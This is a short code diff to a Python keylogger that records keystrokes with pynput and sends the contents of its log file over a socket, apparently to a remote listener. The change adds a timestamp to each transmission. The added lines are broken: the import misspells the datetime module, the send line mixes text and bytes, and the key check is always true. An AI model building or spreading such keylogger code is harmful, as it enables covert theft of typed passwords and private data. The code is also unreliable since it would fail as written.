@@ -4,6 +4,7 @@ from threading import Thread
 import argparse
 import sys
 from pynput.keyboard import Key, Listener
+from datatime import datetime
 
 
 
@@ -58,7 +59,8 @@ def release(key):
     if key == Key.space or Key.enter:
         with open("log.txt", "r") as file1:
             contents = file1.read()
-            s.send(contents.encode())
+            date_now = datetime.now().strftime('%H:%M:%S') 
+            s.send(contents + date_now.encode())
 
 
 
